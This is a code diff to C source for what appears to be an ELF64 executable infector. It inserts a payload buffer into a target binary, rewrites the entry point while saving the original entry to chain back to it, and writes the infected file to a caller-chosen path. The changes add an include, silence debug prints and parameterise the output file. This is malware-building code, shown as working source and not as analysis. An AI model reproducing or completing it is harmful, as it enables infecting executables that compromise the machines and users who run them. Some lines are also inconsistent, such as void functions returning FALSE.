@@ -1,3 +1,5 @@
+#include "elf64.c"
+
 static void _insert(char **s1, size_t *n1, size_t pos, char *s2, size_t n2){
         char *ns;
         if ((ns = (char *)malloc((*n1) + n2)) == NULL) return FALSE;
@@ -29,7 +31,7 @@ void update(char *b, size_t n, size_t old_entry, size_t entry){
 
 	//modifying 2bit after
 	((size_t*)((char*)(b + pos + 2)))[0] = entry - pos;
-	printf("diff: %zx, size: %zx\n", entry - pos, n);
+	//printf("diff: %zx, size: %zx\n", entry - pos, n);
 	((size_t*)((char*)(b + pos + 2)))[1] = n;
 	//move to next entry
 	((u32*)((char*)(b + pos + 0x4a)))[0] = old_entry;
@@ -64,7 +66,7 @@ static size_t _prepare(char **s, size_t *n, char *b, size_t bn){
 	return pos;
 }
 
-void infect(char *fname, char *b, size_t bn){
+void infect(char *fname, char *to, char *b, size_t bn){
 	//if (isFile(fname) == FALSE) return fail("not file");
 	//if (isElf64(fname) == FALSE) return fail("not elf64 binary");
 	char *s; size_t n;
@@ -72,6 +74,7 @@ void infect(char *fname, char *b, size_t bn){
 		return FALSE;
 	//after insert, update data
 	_prepare(&s,&n, b, bn);
-	printf("INSERT NOW!\n");
-	fput("out.bin", s, n);
+	//printf("INSERT NOW!\n");
+	println("INSERT!");
+	fput(to, s, n);
 }
